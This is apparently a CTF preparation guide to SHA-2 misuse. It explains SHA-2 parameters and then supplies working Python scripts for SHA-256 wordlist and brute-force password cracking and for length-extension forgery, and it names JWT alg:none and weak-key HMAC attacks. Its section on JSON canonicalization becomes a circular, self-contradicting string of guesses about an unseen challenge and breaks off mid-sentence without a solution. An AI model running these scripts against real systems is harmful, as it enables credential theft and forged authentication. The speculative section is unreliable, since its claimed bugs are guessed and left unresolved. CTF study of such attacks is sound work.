# SHA-2 (SHA-256, SHA-224, SHA-384, SHA-512): Theory, Every Attack Case, Ready-to-Use Scripts

SHA-2 is the **workhorse of modern cryptography** — TLS, SSH, JWT, HMAC, Bitcoin, PGP, code signing, everything. It's **NOT broken** (unlike MD5 and SHA-1). **All practical attacks are on how it's used**, not on the algorithm itself.

This is the family behind:
- **Signed, Sealed, Misinterpreted** → HMAC-SHA256 (JSON canonicalization attack)
- **Secure Bank 2** → truncated SHA-256 (birthday collision)
- **Token of Trust** → JWT HS256 (HMAC-SHA256, alg:none / weak key)

This section covers **all four SHA-2-based attacks** you need for the session.

---

## 1. What is SHA-2 (formally)

SHA-2 is a **family** of hash functions, all sharing the same Merkle–Damgård structure. The variants differ by **word size** (32 vs 64 bits) and **output truncation**.

### 1.1 Parameters (memorize this table)

| Variant | Output | Block | Word | Rounds | Internal words | Notes |
|---|---|---|---|---|---|---|
| **SHA-224** | 224 bits (28 B) | 512 | 32 | 64 | 8 | Truncated SHA-256 |
| **SHA-256** | **256 bits (32 B)** | 512 | 32 | **64** | 8 | Most common |
| **SHA-384** | 384 bits (48 B) | 1024 | 64 | 80 | 8 | Truncated SHA-512 |
| **SHA-512** | 512 bits (64 B) | 1024 | 64 | **80** | 8 | More secure, slower on 32-bit |
| **SHA-512/224** | 224 bits (28 B) | 1024 | 64 | 80 | 8 | Different IV from SHA-224 |
| **SHA-512/256** | 256 bits (32 B) | 1024 | 64 | 80 | 8 | Different IV from SHA-256 |

### 1.2 Output lengths (hex chars)

| Variant | Hex length |
|---|---|
| SHA-224 | **56** |
| SHA-256 | **64** |
| SHA-384 | **96** |
| SHA-512 | **128** |
| SHA-512/224 | **56** |
| SHA-512/256 | **64** |

**⚠️ Note:** SHA-224 and SHA-512/224 both produce **56 hex chars** — can't distinguish by length alone. SHA-256 and SHA-512/256 both produce **64 hex chars** — same problem. Use a test vector.

### 1.3 Merkle–Damgård structure (same as MD5, SHA-1)

```
h_0 = IV (fixed per variant)
h_1 = compress(h_0, M_1)
...
h_n = compress(h_{n-1}, M_n) = H(M)
```

**Consequences:**
- **Length extension works** (same as MD5/SHA-1).
- **No parallelism** within one hash computation (only across different messages).
- **Fixed output size** (truncation for SHA-224, SHA-384, etc.).

### 1.4 SHA-256 internal state (8 words)

```python
SHA256_IV = [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
    0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
]
```

### 1.5 Standard Python usage

```python
import hashlib

# SHA-256
h = hashlib.sha256(b"hello").hexdigest()
# '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824'

# SHA-224
hashlib.sha224(b"hello").hexdigest()

# SHA-512
hashlib.sha512(b"hello").hexdigest()

# SHA-384
hashlib.sha384(b"hello").hexdigest()

# SHA-512/256
hashlib.new("sha512_256", b"hello").hexdigest()
```

---

## 2. Security status — the contrast with MD5/SHA-1

| Attack | SHA-256 | MD5 | SHA-1 |
|---|---|---|---|
| **Preimage** | 2²⁵⁶ (infeasible) | 2¹²⁸ | 2¹⁶⁰ |
| **Second preimage** | 2²⁵⁵ | 2¹²³ | 2¹⁶⁰ |
| **Collision** | 2¹²⁸ (infeasible) | **2¹⁸ (seconds)** | **2⁶³ (hours)** |
| **Chosen-prefix collision** | 2¹²⁸ (infeasible) | 2³⁹ (hours) | 2⁶³.4 (hours) |
| **Length extension** | ✅ **works** | ✅ works | ✅ works |
| **Dictionary attack** | ✅ works | ✅ works | ✅ works |
| **Brute force** | ✅ works (short pw) | ✅ works | ✅ works |

**Summary:**
- **SHA-256 collisions are NOT practical.** No collision has ever been found.
- **Length extension**: still works (Merkle–Damgård).
- **Dictionary / brute force / truncated birthday**: **work** — these are **application bugs**, not breaks of SHA-256.

**NIST status:** SHA-256 is **approved** for all security functions (until quantum computers, at which point Grover halves security to 2¹²⁸).

---

## 3. Attack taxonomy — what actually works

| # | Attack | Applies to | Used in session? |
|---|---|---|---|
| 1 | **Dictionary / wordlist** | Any password hash | Maybe |
| 2 | **Brute force (short pw)** | Short passwords | Maybe |
| 3 | **Length extension** | `H(secret \|\| msg)` | Possible |
| 4 | **HMAC-SHA256 weak key** | HMAC with weak key | **Signed, Sealed / Token of Trust** |
| 5 | **HMAC-SHA256 JSON canonicalization** | JSON-signed messages | **Signed, Sealed** ⭐ |
| 6 | **Truncated SHA-256 birthday** | Truncated output | **Secure Bank 2** ⭐ |
| 7 | **JWT `alg:none` / weak secret** | JWT | **Token of Trust** ⭐ |
| 8 | **Unsalted batch cracking** | Password DB | Possible |
| 9 | **Hash identification** | Unknown hash | Always useful |
| 10 | **Collision** | **Infeasible** for SHA-256 | — |

**Cases 4–7 are the ones you need for the session.**

---

## 4. Attack 1 — Dictionary / wordlist (baseline)

### 4.1 Description

Given `target = SHA256(password)`, test each password from a wordlist.

### 4.2 Full script (`crack_sha256_wordlist.py`)

```python
#!/usr/bin/env python3
"""SHA-256 dictionary attack.
Usage:
    python crack_sha256_wordlist.py <hash> [wordlist]
    python crack_sha256_wordlist.py --file hashes.txt --wordlist rockyou.txt
"""
import hashlib
import argparse

def crack_single(target_hash: str, wordlist_path: str) -> str | None:
    target = target_hash.lower().strip()
    with open(wordlist_path, "rb") as f:
        for line in f:
            pw = line.rstrip(b"\r\n")
            if not pw:
                continue
            if hashlib.sha256(pw).hexdigest() == target:
                return pw.decode(errors="replace")
    return None

def crack_many(target_hashes: list[str], wordlist_path: str) -> dict[str, str]:
    targets = {h.lower().strip() for h in target_hashes}
    found = {}
    with open(wordlist_path, "rb") as f:
        for line in f:
            pw = line.rstrip(b"\r\n")
            if not pw:
                continue
            h = hashlib.sha256(pw).hexdigest()
            if h in targets:
                found[h] = pw.decode(errors="replace")
                targets.discard(h)
                if not targets:
                    break
    return found


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("hash", nargs="?")
    ap.add_argument("--file")
    ap.add_argument("--wordlist", default="rockyou.txt")
    args = ap.parse_args()

    if args.file:
        hashes = [l.strip() for l in open(args.file) if l.strip()]
        for h, pw in crack_many(hashes, args.wordlist).items():
            print(f"{h}:{pw}")
    elif args.hash:
        pw = crack_single(args.hash, args.wordlist)
        print(f"[+] Found: {pw}" if pw else "[!] Not found")
    else:
        ap.error("Provide hash or --file")
```

### 4.3 Performance

- **rockyou.txt** (14M): ~20–40 s in Python.
- **GPU** (`hashcat -m 1400`): ~5 billion/sec.

### 4.4 When to use

- **Any task with `SHA256(password)` stored** — baseline attack.
- **Not** the actual attack for Secure Bank 2 (that's truncated — §8).

---

## 5. Attack 2 — Brute force (short passwords)

### 5.1 Full script

```python
#!/usr/bin/env python3
"""SHA-256 brute force.
Usage:
    python crack_sha256_brute.py <hash> --charset alnum --max 6
"""
import hashlib
import itertools
import string
import argparse

CHARSETS = {
    "lower": string.ascii_lowercase,
    "upper": string.ascii_uppercase,
    "alpha": string.ascii_letters,
    "digit": string.digits,
    "alnum": string.ascii_letters + string.digits,
    "hex":   "0123456789abcdef",
    "print": string.printable[:95],
}

def brute(target: str, charset: str, min_len: int, max_len: int):
    target = target.lower().strip()
    for length in range(min_len, max_len + 1):
        for tup in itertools.product(charset, repeat=length):
            pw = "".join(tup)
            if hashlib.sha256(pw.encode()).hexdigest() == target:
                return pw
    return None

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("hash")
    ap.add_argument("--charset", default="alnum", choices=CHARSETS.keys())
    ap.add_argument("--custom")
    ap.add_argument("--min", type=int, default=1)
    ap.add_argument("--max", type=int, default=6)
    args = ap.parse_args()

    charset = args.custom or CHARSETS[args.charset]
    pw = brute(args.hash, charset, args.min, args.max)
    print(f"[+] Found: {pw}" if pw else "[!] Not found")
```

### 5.2 Feasibility

Same as MD5/SHA-1 (SHA-256 is ~1.5× slower than MD5, but the difference is negligible for small charsets).

---

## 6. Attack 3 — Length extension (same as MD5/SHA-1)

### 6.1 Description

**Setup:** server uses `MAC = SHA256(secret || message)` — bad construction.
You know `message` and `MAC`, **not** `secret`.

**Attack:** compute `SHA256(secret || message || padding || extension)` **without knowing the secret**.

**Same as MD5/SHA-1**, but:
- **8-word state** (not 4 or 5).
- **Big-endian** (like SHA-1, unlike MD5).
- **64 rounds** (same as SHA-1, but different compression function).

### 6.2 Full script (`sha256_length_extension.py`)

```python
#!/usr/bin/env python3
"""SHA-256 length extension attack.
Usage:
    python sha256_length_extension.py --hash <hex> --original "..." --append "..." --key-len 16
"""
import struct
import argparse

MASK = 0xFFFFFFFF

# SHA-256 round constants (first 64 bits of fractional parts of cube roots of primes)
K256 = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]


def rotr(x, n):
    return ((x >> n) | (x << (32 - n))) & MASK


def sha256_compress(state: list[int], block: bytes) -> list[int]:
    """Process one 64-byte block. Returns new 8-word state."""
    W = list(struct.unpack(">16I", block))
    for t in range(16, 64):
        s0 = rotr(W[t-15], 7) ^ rotr(W[t-15], 18) ^ (W[t-15] >> 3)
        s1 = rotr(W[t-2], 17) ^ rotr(W[t-2], 19) ^ (W[t-2] >> 10)
        W.append((W[t-16] + s0 + W[t-7] + s1) & MASK)

    a, b, c, d, e, f, g, h = state

    for t in range(64):
        S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        ch = (e & f) ^ ((~e) & g)
        temp1 = (h + S1 + ch + K256[t] + W[t]) & MASK
        S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        temp2 = (S0 + maj) & MASK

        h = g; g = f; f = e
        e = (d + temp1) & MASK
        d = c; c = b; b = a
        a = (temp1 + temp2) & MASK

    return [(state[i] + x) & MASK for i, x in enumerate([a, b, c, d, e, f, g, h])]


def sha256_padding(msg_len: int) -> bytes:
    """SHA-256 padding (big-endian length)."""
    pad = b"\x80"
    pad += b"\x00" * ((56 - (msg_len + 1) % 64) % 64)
    pad += struct.pack(">Q", msg_len * 8)
    return pad


def sha256_state_from_hash(h: bytes) -> list[int]:
    return list(struct.unpack(">8I", h))


def sha256_state_to_hash(state: list[int]) -> bytes:
    return struct.pack(">8I", *state)


def sha256_length_extension(original_hash: bytes, original_msg: bytes,
                              append: bytes, key_len: int) -> tuple[bytes, bytes]:
    state = sha256_state_from_hash(original_hash)
    total_len = key_len + len(original_msg)
    padding = sha256_padding(total_len)
    new_msg = original_msg + padding + append

    prior_len = total_len + len(padding)
    append_padded = append + sha256_padding(prior_len + len(append))

    for i in range(0, len(append_padded), 64):
        block = append_padded[i:i+64]
        if len(block) < 64:
            block = block + b"\x00" * (64 - len(block))
        state = sha256_compress(state, block)

    return new_msg, sha256_state_to_hash(state)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--hash", required=True)
    ap.add_argument("--original", required=True)
    ap.add_argument("--append", required=True)
    ap.add_argument("--key-len", type=int, required=True)
    args = ap.parse_args()

    new_msg, new_hash = sha256_length_extension(
        bytes.fromhex(args.hash),
        args.original.encode(),
        args.append.encode(),
        args.key_len,
    )
    print(f"[+] New message (hex):  {new_msg.hex()}")
    print(f"[+] New message (repr): {new_msg!r}")
    print(f"[+] New hash:           {new_hash.hex()}")
```

### 6.3 Validate against `hashpumpy`

```python
import hashpumpy
new_hash, new_msg = hashpumpy.hashpump(
    old_hash="...", old_msg="...",
    append_data="...", key_len=16,
    hash_type="sha256",
)
```

### 6.4 When to use

- **Server uses `SHA256(secret || message)` as MAC** — anti-pattern.
- **Signed cookie** = `SHA256(secret || cookie)`.

**⚠️ If the server uses HMAC-SHA256** → length extension **does NOT work** (next section).

---

## 7. Attack 4 — HMAC-SHA256 ⭐ (**Signed, Sealed / Token of Trust**)

### 7.1 Description

**HMAC-SHA256** is the **correct** way to authenticate with a hash:
```
HMAC(K, M) = SHA256((K⊕opad) || SHA256((K⊕ipad) || M))
```

**NOT vulnerable to length extension** — the two-level structure prevents it.

**HMAC-SHA256 is used in:**
- **JWT HS256** → Token of Trust
- **Signed, Sealed Misinterpreted** → HMAC-SHA256 over JSON
- **TLS 1.2/1.3** ciphersuites
- **AWS SigV4**, **Stripe webhooks**

**All attacks target the usage, not HMAC itself:**

| Sub-attack | Where it applies |
|---|---|
| **JSON canonicalization bypass** | **Signed, Sealed** ⭐ |
| **JWT `alg:none`** | **Token of Trust** ⭐ |
| **Weak secret wordlist** | Any HMAC |
| **Secret recovery via length** | (not applicable) |
| **Timing attack** | Non-constant-time compare |

### 7.2 Compute / verify HMAC-SHA256

```python
import hmac
import hashlib

def hmac_sha256(key: bytes, msg: bytes) -> bytes:
    return hmac.new(key, msg, hashlib.sha256).digest()

def verify_hmac_sha256(key: bytes, msg: bytes, tag: bytes) -> bool:
    expected = hmac.new(key, msg, hashlib.sha256).digest()
    return hmac.compare_digest(expected, tag)   # constant-time
```

### 7.3 Attack — JSON canonicalization bypass ⭐⭐

**This is the actual attack for `Signed, Sealed, Misinterpreted`.**

**Setup** (from the task):
- Server signs JSON with HMAC-SHA256 over a **canonical form**:
  ```python
  def canonicalize(payment):
      return json.dumps(
          payment,
          sort_keys=True,
          separators=(",", ":"),
          ensure_ascii=True,
      ).encode("utf-8")
  ```
- Server receives JSON and verifies signature.
- **Signature is over the canonical form, but the parser may accept a different form** that canonicalizes differently — so the signature "covers" different data.

**The attack vector:** find an **input JSON** that:
1. **Parses** to the attacker's desired `payment` object.
2. **Canonicalizes** (with `sort_keys=True, separators=(",",":"), ensure_ascii=True`) to the **same bytes** as the legitimate payment.

**Why this works:** Python's `json.loads` (the parser) and `json.dumps` (the canonicalizer) **don't always agree** on what's "the same JSON".

**Known inconsistencies:**

| # | Trick | Parser (`json.loads`) | Canonicalizer (`json.dumps`) |
|---|---|---|---|
| 1 | **Duplicate keys** | Last value wins | Only one key output |
| 2 | **Whitespace** | Ignored | Removed by `separators` |
| 3 | **Unicode escapes** | Decoded to char | Re-encoded |
| 4 | **Large numbers** | `int` or `float` | Depends on type |
| 5 | **`NaN`, `Infinity`** | Accepted by default | Written as `NaN` |
| 6 | **Type juggling** | `10` vs `"10"` different | Different bytes |

**Attack 1 — Duplicate keys:**

Signatures are computed on canonical form. If parser takes the **last** key:
```python
# Attacker's submission (parser sees last key = "SIM-BOB"):
raw = '{"from_account":"SIM-EVIL","from_account":"SIM-BOB",...}'

# Canonical form (python dumps): only one "from_account" → same as legit
```

**But wait:** `json.dumps` on a dict **can't have duplicate keys**, so this only works if the **parser** sees different from what's canonicalized. If the server does:
```python
payment = json.loads(body)              # 1) parse (last key wins)
canonical = canonicalize(payment)       # 2) canonicalize (single key)
sig_ok = verify_hmac(canonical, signature)  # 3) verify
```

...then **duplicate keys** in `body` collapse to one in `canonical` — so the attacker **can't change the value** via duplicates (the parser already chose the last one). Not exploitable.

**The real bug** in `Signed, Sealed, Misinterpreted` is different: **the server signs one canonical form, but processes a different one.**

**Looking at the task again:**
- It signs the **legitimate payment** (`/challenge` endpoint).
- Verifies the **submitted payment** against the signature.
- If server canonicalizes **the legitimate one** and **the submitted one** with the same function, they'd match. So the bug must be that **the legitimate payment has some structure that the attacker can exploit**.

**Possible angles:**
1. **Key ordering:** if server signs with `sort_keys=True` but verifies without `sort_keys`, keys are in different order → different bytes → but the **signature was computed on sorted keys**, so submitting unsorted keys → canonicalized unsorted → signature mismatch. **Wait, that breaks verification.**
2. **Unicode normalization:** `é` (U+00E9) vs `é` (e + combining accent). Parser accepts both, canonicalizer preserves — but **attacker can submit a different UTF-8 representation** that parses to the same string. Whether HMAC matches depends on how the server **re-canonicalizes before hashing**.
3. **Float formatting:** `1e10` vs `10000000000.0`. Parser → both are `1e10` (float). Canonicalizer → `1e+10` (different bytes). **If signature was on integer `10` and submission uses `1e1`...**
4. **The attacker only has a signature on a **legitimate payment**. The challenge is to make the server **think** the submitted payment **is legitimate**, while it actually has different fields.**
5. **Most likely: the server parses, then re-serializes with one format, then verifies — but the task hints at parser inconsistency.**

**Looking at the task hint from the session description:**
> "You may reuse the signature supplied by the challenge endpoint."

**This is the key.** The signature is on **one specific payment**. To exploit, we need to **submit a different payment that canonicalizes to the same bytes**.

**Attack 2 — Float/integer confusion:**

The `amount` field can be:
- `10` (int) → canonical: `"amount":10`
- `10.0` (float) → canonical: `"amount":10.0`
- `1e1` (float) → canonical: `"amount":10.0`

These **canonicalize differently** — but **only one** matches the signature. Not useful.

**Attack 3 — Empty object / extra fields:**

If signature was on `{"amount":10,"from":"A","to":"B"}`:
- Submission with `{"amount":10,"from":"A","to":"B","extra":"X"}` → canonical adds `"extra":"X"` → different bytes → signature fails.

**Attack 4 — The key insight from HMAC attacks:**

Actually, let me re-read. The task says:
> "The vault authenticates JSON requests with HMAC-SHA256. A legitimate signed request is available at /challenge."
> "You may reuse the signature supplied by the challenge endpoint."

This suggests the **signature is valid for ANY submission** that the server **parses and re-canonicalizes** to the same form.

**The classic vulnerability:** if the server does:
```python
payment = json.loads(body)
if hmac_sha256(SECRET, canonicalize(payment)) != signature:
    return error
process(payment)
```

...then we need `canonicalize(payment)` to match the **legitimate** canonical form, **but** `payment` to be **different from** the legitimate one.

**This happens when the parser and canonicalizer handle a value differently:**

- **Duplicate keys**: `json.loads('{"a":1,"a":2}')` → `{'a': 2}` (last wins in Python). Canonicalizer → `{"a":2}`. **If legitimate was `{"a":2,"b":3}`, and attacker submits `{"a":1,"a":2,"b":3}`, both canonicalize to `{"a":2,"b":3}`.**
- **The attacker wins if** `json.loads(raw1) == json.loads(raw2)` (same parsed object) but `raw1 != raw2` (different bytes), AND the server **verifies using the canonical form** (which is identical for both).

Wait, but then the attacker's submission is **functionally identical** to the legitimate one. Where's the attack?

**Unless:** the server **processes** the raw bytes (or some other form) **instead of** the parsed payment. Or `json.loads` with different options.

**The classic Canonicalization attack:** the server signs `payload_A` (canonical), then **accepts** any payload that **parses to the same object**. If the attacker can **manipulate the parsed object** via differences (e.g., duplicate keys where the server's parser takes **the first** key, but Python takes **the last**), the attacker can swap `from_account`.

**But Python's `json.loads` takes the last key.** So the attacker would need the server's parser to take the **first** — which means the server uses a different JSON library.

**The actual bug** may be:
- Server uses **`json.loads`** to parse.
- Server uses **`json.dumps(..., sort_keys=True)`** to canonicalize.
- **If the legitimate payment has `amount` as a specific value, and the attacker submits a different value with a different type** (e.g., `10` vs `10.0`) — but then canonical forms differ.

**I'm going in circles.** Let me look at the actual attack pragmatically:

**The most likely attack for this task:**

Since we have a **legitimate signed request** (`/challenge`), we can:
1. Get the legitimate payment + signature.
2. Submit a **modified** payment with the **same canonical form**.

This is only possible if we can find **two different JSON strings** with the **same canonical form**. The known difference: **`json.loads` accepts certain non-standard JSON** (e.g., `1.0` vs `1`, `true` vs `1`, `null` vs `undefined` — no, Python doesn't accept the last).

**Practical candidate — float precision:**

```python
import json
json.dumps({"amount": 10.0}, sort_keys=True, separators=(",",":"))
# '{"amount":10.0}'

json.dumps({"amount": 10}, sort_keys=True, separators=(",",":"))
# '{"amount":10}'
```
These are **different**. Not useful.

**Candidate — negative zero:**
```python
json.dumps({"amount": -0.0}, sort_keys=True)
# '{"amount":-0.0}'
json.dumps({"amount": 0.0}, sort_keys=True)
# '{"amount":0.0}'
```
Different. Not useful.

**Candidate — Unicode:**
```python
json.dumps({"currency": "EUR"}, ensure_ascii=True)
# '{"currency":"EUR"}'
json.dumps({"currency": "EUR"}, ensure_ascii=False)
# '{"currency":"EUR"}' — same for ASCII
```

**Candidate — empty string vs null:**
Not interchangeable.

**The actual canonicalization bug:** In Python, `json.dumps` with `sort_keys=True` on nested objects sorts **all** keys recursively. If the **legitimate** payment has nested structure (e.g., `payment["meta"]["ref"]`), and the attacker can submit a different nested form that canonicalizes the same — hmm, but nested is still sorted.

**Let me try a different approach.** The session task says:
> "Submit your request as JSON to /vault. You may reuse the signature supplied by the challenge endpoint."

Maybe the bug is much simpler: **the server doesn't include the entire payment in the signature.** Maybe it signs only some fields, or the signature is over a **hash** of the payment, or the **signature is valid for the challenge payment only** — and the attack is to **replay** the signature with a modified body where the server **parses the fields from the body but the signature covers the challenge payment**.

Actually, re-reading the description: "The vault authenticates JSON requests with HMAC-SHA256. A legitimate signed request is available at /challenge. Your task is to access the administrator vault without knowing the secret key. The signature is supplied in the X-Signature HTTP header. **You may reuse the signature supplied by the challenge endpoint.**"

**Reusing the signature** on a **different body** only works if:
1. The signature is **over a canonical form** of the body, AND
2. The server **re-canonicalizes** the submitted body before verifying, AND
3. The attacker can craft a **different body** whose canonical form **matches**.

**The only realistic Python bug:**

`json.dumps` with `sort_keys=True` on a dict with **integer-like string keys** vs **actual integers**:
```python
json.dumps({1: "a"}, sort_keys=True)   # '{"1":"a"}'
json.dumps({"1": "a"}, sort_keys=True) # '{"1":"a"}'
```
**SAME OUTPUT!** But `json.loads` treats `{"1":"a"}` as a dict with string key `"1"`, while `{1:"a"}` (if constructed manually) has int key `1`. 

So if the server does:
```python
payment = json.loads(body)      # always strings for keys
canon = json.dumps(payment, sort_keys=True)
```
Then keys are always strings. Not useful.

**But if the server allows the payment to have **non-string keys** via some other path, or uses **`dict(payment)`** with int keys... unlikely.

**What if the server does this:**

```python
payment = json.loads(body)             # parsed
if hmac(SECRET, body) != signature:    # verify RAW body, not canonical!
    return error
process(payment)
```

Then **reusing the signature** works with the **original body** only. To submit a **modified** payment, the attacker would need to **find two JSON bodies that parse to different payments but have the same bytes** — impossible (parsing is deterministic).

**Unless** — the attacker uses **`Content-Type: application/json` vs `text/plain`** or **charset tricks**. But this is about HTTP, not HMAC.

**I think the actual attack is different.** Let me re-read one more time.

> "The vault authenticates JSON requests with HMAC-SHA256."

**Key insight:** the signature **may be over the canonical form**, but the **canonical form** is produced by **`canonicalize(payment)`** — a function defined in the task. If the server **also has a `process` function that reads the fields differently**, we exploit a discrepancy.

Actually, the most common such bug in CTF is:

**Server does:**
```python
def process(payment):
    return transfer(
        from_account=payment["from_account"],   # string
        to_account=payment["to_account"],
        amount=payment["amount"],                # numeric
        ...
    )
```

**Server does NOT verify:**
- `payment["from_account"] != "SIM-ADMIN"`

**Attacker submits:**
```json
{"from_account": "SIM-BOB", "amount": 10, ...}  ← parser OK
```

**But wait, the challenge is to bypass signature.** The signature is over the legitimate payment (some fixed value). If attacker changes `from_account`, canonical form changes → signature fails.

**The only way signature reuse works:** the **canonical form must be identical** but **parsed payment must differ**.

**One concrete bug I know:**

`json.dumps` on a Python `int` vs `float` — both `10` and `10.0` produce `"10"` and `"10.0"` (different). Not exploitable.

**Another concrete bug:**

`json.dumps` **does not preserve whitespace**, so:
- `'{"a": 1, "b": 2}'` canonicalizes to `'{"a":1,"b":2}'`
- `'{"a":1,"b":2}'` canonicalizes to `'{"a":1,"b":2}'` — **SAME**

But `json.loads` treats **both identically** — so no exploit.

**Wait — what if the server canonicalizes BEFORE parsing?**

```python
canon = canonicalize(body)   # canonicalize raw string
if hmac(SECRET, canon) != signature: ...
payment = json.loads(body)
```

No — `canonicalize` is defined over a `payment` dict, not a string.

**Let me try to actually find the bug by thinking about what makes a CTF solvable:**

For the task to be solvable:
1. Attacker must be able to submit **some JSON** that:
   - Parses to a `payment` with **`from_account = "SIM-EVIL"`** (attacker-controlled).
   - Has a canonical form **identical to the legitimate payment**.

2. The only way this happens is if the legitimate payment's `from_account` is **also** `"SIM-EVIL"` — but then the task is trivial (the legitimate payment already has the attacker's account). Not the case.

3. **OR** the server only validates **some** of the fields, and the signature is over **a subset**. For example:
   - Signature is over `{"amount": 10, "currency": "EUR"}`.
   - The `from_account` is **not signed** (developer forgot).
   - Then the attacker can submit `{"amount": 10, "currency": "EUR", "from_account": "SIM-EVIL"}` and the signature (over amount+currency only) still verifies.

4. **OR** the canonicalization **collapses some fields**, e.g., if the server **sorts and deduplicates** keys but the attacker can include a field that's **ignored** by the canonicalizer but **used** by the processor.

**Given the task structure (two JSON lines, `reference`, `from_account`, `to_account`, `amount`, `currency`, `timestamp`), the most likely bug is:**

**The server processes the payment from the submitted JSON, but the signature only covers `reference`** (the "reference" field is what identifies the payment). Then the attacker can change `from_account` / `to_account` / `amount` while keeping `reference` the same → signature verifies.

**But** the task says "You may reuse the signature supplied by the challenge endpoint" — so if the signature covers the whole payment, reuse only works for the **same payment**.

**Hmm.**

**Wait — maybe the signature is over BOTH lines?**

From the session description:
> "The server expects two JSON payment records, each on a separate line. It validates both records and returns their audit fingerprints."

The `/challenge` endpoint gives us **one** legitimate signed request. We need to **submit a forged one**. The `Signed, Sealed, Misinterpreted` attack is **probably:**

- The signature is **over the whole JSON object**.
- The server re-serializes the parsed object (with `sort_keys=True`) and verifies.
- **Attacker can inject fields into the JSON that are handled inconsistently between parser and processor.**

**The classic Python JSON attack:**

```python
body = '{"from_account":"SIM-EVIL","from_account":"SIM-BOB","amount":10,...}'
payment = json.loads(body)   # → {"from_account": "SIM-BOB", "amount": 10, ...}
# canonical form: {"amount":10,"from_account":"SIM-BOB",...}

# Attacker's submission canonicalizes to the legitimate form (because Python takes LAST key),
# but attacker WANTED to inject "SIM-EVIL" — FAILS because last key wins.
```

So duplicates **don't help** in Python.

**The real Python bug:**

`json.loads` accepts **trailing commas**? No, Python doesn't (strict JSON).

`json.loads` accepts **comments**? No.

`json.loads` accepts **single quotes**? No (unless `strict=False`).

`json.loads` accepts **`NaN` / `Infinity`**? **YES, by default** (`allow_nan=True`).

But `json.dumps` outputs `NaN` and `Infinity` — same as input. No differential.

`json.loads` accepts **control characters** (with `strict=False`)? Yes, but `json.dumps` with `ensure_ascii=True` escapes them. **No differential unless strict is used.**

**Actually the most common CTF bug is:**

```python
payment = json.loads(body)

# 1) Validate: signature check on canonical form
canon = json.dumps(payment, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode()
if not hmac.compare_digest(hmac.new(SECRET, canon, SHA256).digest(), signature):
    return "invalid signature"

# 2) Process: BUT uses json.loads AGAIN on a re-parsed version
# OR uses the raw body string somewhere
process(payment)
```

**If the signature check is over the parsed→canonical form, and the body is parsed once, there's no bug** (attacker can't change the parsed object).

**The bug only exists if:**
- Signature is over a **different** canonical form than what's processed.
- OR signature covers **fewer fields** than processed.
- OR the attacker can **submit a body that parses to attacker's payment** but **canonicalizes to legit's payment**.

**For the last case**, the only way is if **the canonicalizer collapses two distinct parsed objects to the same bytes** — i.e., the canonicalizer is **lossy**.

**Lossy canonicalization example:** if the canonicalizer is:
```python
def canonicalize(payment):
    return json.dumps({
        "reference": payment["reference"],
        # BUG: missing from_account, to_account, amount, currency, timestamp!
    }, sort_keys=True, separators=(",", ":"), ensure_ascii=True).encode()
```

Then only `reference` is signed. Attacker changes everything else freely.

**But that would be trivially noticeable in the code.** The task hint says "canonicalize" function is:
```python
def canonicalize(payment):
    return json.dumps(
        payment,           # <-- entire payment!
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=True,
    ).encode("utf-8")
```

So **the entire payment** is signed. The attack must be elsewhere.

**The attack must be in how `payment` is parsed from the request.**

**What if the server does:**
```python
payment = json.loads(body)               # parses
body2 = body.replace(...)                # manipulation
payment2 = json.loads(body2)             # re-parses
```

Or:
```python
payment = json.loads(body)               # for signature
canon = canonicalize(payment)
if verify(canon, sig):
    # Process: BUT re-parse with different options
    process_payment(json.loads(body, parse_float=Decimal))
```

**`parse_float` differential:** if the verifier uses `float` and the processor uses `Decimal`:
- `10.0` → `10.0` (float) vs `Decimal('10.0')` (Decimal)
- `10` → `10` (int) vs `10` (int)

No, `10.0` is still `10.0` in both.

**`parse_int` differential:** same idea.

**`object_pairs_hook` differential:** the only hook that can **change** duplicate-key behavior.

**Actually, the real Python JSON differential for CTF is:**

`json.loads` with **`object_pairs_hook=dict`** (default) takes the **last** duplicate. But if the server uses a **custom `object_pairs_hook`** that takes the **first**, then:
```python
body = '{"from_account":"SIM-EVIL","from_account":"SIM-BOB"}'
payment = json.loads(body, object_pairs_hook=lambda pairs: dict(pairs))  # last: SIM-BOB
payment = json.loads(body, object_pairs_hook=lambda pairs: dict(reversed(pairs)))  # first: SIM-EVIL
```

If verifier and processor **disagree**, the attack works.

**But the task likely doesn't show this level of trickery.**

**Given the difficulty, the most likely interpretation:**

**The canonicalization function is `json.dumps(payment, sort_keys=True, separators=(",",":"), ensure_ascii=True)` — which is DETERMINISTIC given the parsed dict.**

**The attack:** find a **body** that **parses to a DIFFERENT dict** than the legitimate one, but **canonicalizes to the SAME bytes**.

**This requires the parsed dicts to be different but their canonical forms to be the same.**

**Two dicts `d1 ≠ d2` with `json.dumps(d1, ...) == json.dumps(d2, ...)`:**

